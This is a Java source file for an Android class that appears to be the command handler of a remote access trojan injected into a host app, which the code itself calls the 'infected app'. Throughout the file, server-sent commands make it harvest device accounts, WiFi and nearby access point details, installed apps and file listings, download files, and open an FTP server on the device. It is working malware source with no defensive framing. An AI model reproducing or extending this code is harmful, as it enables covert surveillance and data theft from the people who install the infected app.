package com.safe.myapp;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.widget.Toast;

import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Locale;

public class SafeCommands {

    private Context context;
    private SafeCommunications comms;
    private SafeLogger logger;
    private SafeFTPServer ftpServer;
    private String simpleId;

    // TODO make key value pair
    private static final String[] COMMANDS = {
            "respond" , "toast "  , "dialog "  , "wifi"    ,
            "accounts", "ls "     , "download ", "commands",
            "version" , "infected",  "status"  , "ftp start",
            "ftp stop", "apps"    , "downlast "};


    public SafeCommands(Context context, SafeCommunications comms, SafeLogger logger, SafeFTPServer ftpServer, String simpleId) {
        this.context = context;
        this.comms = comms;
        this.logger = logger;
        this.ftpServer = ftpServer;
        this.simpleId = simpleId;
    }

    // handle messages
    public void messageHandler(String fromServer) {
        logger.write(fromServer);
        if (fromServer.equalsIgnoreCase(COMMANDS[0])) {
            comms.say("Responding");
        } else if (fromServer.startsWith(COMMANDS[1])) {
            toast(fromServer);
        } else if (fromServer.startsWith(COMMANDS[2])) {
            dialog(fromServer);
        } else if (fromServer.startsWith(COMMANDS[3])) {
            getWiFiNetworks();
        } else if (fromServer.startsWith(COMMANDS[4])) {
            getAccounts();
        } else if (fromServer.startsWith(COMMANDS[5])) {
            listDir(fromServer.substring(COMMANDS[5].length(), fromServer.length()));
        } else if (fromServer.startsWith(COMMANDS[6])) {
            comms.download(fromServer.substring(COMMANDS[6].length(), fromServer.length()));
        } else if (fromServer.startsWith(COMMANDS[7])) {
            for (String command : COMMANDS) {
                comms.say(command);
            }
        } else if (fromServer.startsWith(COMMANDS[8])) {
            comms.say("Version: " + SafeService.VERSION);
        } else if (fromServer.startsWith(COMMANDS[9])) {
            comms.say("Injected in: " + context.getApplicationContext().getPackageName());
        } else if (fromServer.equalsIgnoreCase(COMMANDS[10])) {
            sayStatus();
        } else if (fromServer.startsWith(COMMANDS[11])) {
            try {
                String stringPort = fromServer.substring(COMMANDS[11].length() + 1, fromServer.length());
                try {
                    int port = Integer.parseInt(stringPort);
                    ftpServer.startServer(port);
                } catch (NumberFormatException e) {
                    comms.say("Not a valid port: \'" + stringPort + "\'");
                }
            } catch (StringIndexOutOfBoundsException e) {
                comms.say("Not a valid command, need \"ftp start port_num\"");
            }
        } else if (fromServer.equalsIgnoreCase(COMMANDS[12])) {
            ftpServer.stopServer();
        } else if (fromServer.equalsIgnoreCase(COMMANDS[13])) {
            installedApps();
        } else if (fromServer.startsWith(COMMANDS[14])) {
            String[] args = fromServer
                    .substring(COMMANDS[14].length(), fromServer.length())
                    .split("\\s*,\\s*");
            int amount;
            // Check if we have the correct amount of args
            if(args.length != 2){
                comms.say("Need: \'downlast ##, /directory/location\'");
                return;
            }
            // Everything fine, try to parse the amount of files to download
            try {
                amount = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                comms.say("Cant parseInt. Need: \'downlast ##, /directory/location\'");
                return;
            }
            // Everything fine, download last files based on creation date.
            comms.downloadLast(amount, args[1]);
        }
    }

    private void getWiFiNetworks() {
        ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        WifiManager wifiMgr = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
        if (mWifi.isConnected()) {
            comms.say("Connected to: " + wifiInfo.getSSID() + " " + wifiInfo.getBSSID() + " " + wifiInfo.getMacAddress());
            comms.say("IP address  : " + Formatter.formatIpAddress(wifiInfo.getIpAddress()));
        } else {
            comms.say("Wifi not connected");
        }
        comms.say("Nearby access points:");
        List<ScanResult> results = wifiMgr.getScanResults();
        for (ScanResult result : results) {
            comms.say(result.SSID + " " + result.BSSID + " " + result.level);
        }
    }

    private void getAccounts() {
        Account[] accounts = AccountManager.get(context).getAccounts();
        StringBuilder sbAccounts = new StringBuilder();
        sbAccounts.append("Accounts:\r\n");
        if (accounts.length > 0) {
            for (Account account : accounts) {
                sbAccounts.append(account.toString());
                sbAccounts.append("\r\n");
            }
        } else {
            sbAccounts.append("Could not find any accounts");
        }
        comms.say(sbAccounts.toString());
    }

    private String getFirstAccount() {
        Account[] accounts = AccountManager.get(context).getAccounts();
        if (accounts.length > 0) {
            return accounts[0].name;
        } else {
            return "no accounts found";
        }
    }

    // use AsyncTask to give some work out of hands to run toast on UI thread
    private void toast(String message) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String[] params) {
                String str = params[0];
                return str.substring(6, str.length());
            }

            @Override
            protected void onPostExecute(String message) {
                Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
            }
        }.execute(message);
    }

    private void dialog(String message) {
        Intent i = new Intent(context, SafeDialog.class);
        i.putExtra("message", message.substring(7, message.length()));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(i);
    }

    private void listDir(String dir) {
        if (dir.equals("")) {
            comms.say("usage \"ls /\"");
        }
        try {
            File directory = new File(Environment.getExternalStorageDirectory(), dir);
            File[] listOfFiles = directory.listFiles();
            if (listOfFiles.length > 0) {
                StringBuilder ls = new StringBuilder();
                ls.append("dir: " + dir);
                ls.append(dir);
                ls.append("\r\n");
                for (File file : listOfFiles) {
                    ls.append(file.getName());
                    ls.append("\r\n");
                }
                comms.say(ls.toString());
            } else {
                comms.say("Directory is empty");
            }
        } catch (NullPointerException e) {
            comms.say("w00ps");
        }
    }

    private void sayStatus() {
        WifiManager wifiMgr = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
        String ssid = wifiInfo.getSSID();
        if (ssid.equals("<unknown ssid>")) {
            ssid += " probably on mobile data";
        } else {
            ssid += " state " + wifiInfo.getSupplicantState();
        }
        StringBuilder sb = new StringBuilder();
        sb.append("status:\r\n");
        sb.append("########################################################");
        sb.append("\r\n");
        sb.append("brand + model   = " + Build.BRAND + " " + Build.MODEL);
        sb.append("\r\n");
        sb.append("android version = " + Build.VERSION.SDK_INT);
        sb.append("\r\n");
        sb.append("account[0]      = " + getFirstAccount());
        sb.append("\r\n");
        sb.append("language        = " + Locale.getDefault().getDisplayLanguage());
        sb.append("\r\n");
        sb.append("wifi status     = " + ssid);
        sb.append("\r\n");
        sb.append("infected app    = " + context.getApplicationContext().getPackageName() + " v" + SafeService.VERSION);
        sb.append("\r\n");
        sb.append("########################################################");
        sb.append("\r\n");
        comms.say(sb.toString());
    }

    private void installedApps() {
        StringBuilder sbApps = new StringBuilder();
        sbApps.append("Installed apps:\r\n");
        List<PackageInfo> packList = context.getPackageManager().getInstalledPackages(0);
        List<String> apps = new ArrayList<>();
        for (int i = 0; i < packList.size(); i++) {
            PackageInfo packInfo = packList.get(i);
            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                apps.add(packInfo.applicationInfo.loadLabel(context.getPackageManager()).toString());
            }
        }
        Collections.sort(apps);
        for (int i = 0; i < apps.size(); i++) {
            sbApps.append(apps.get(i));
            sbApps.append("\r\n");
        }
        comms.say(sbApps.toString());
    }

}
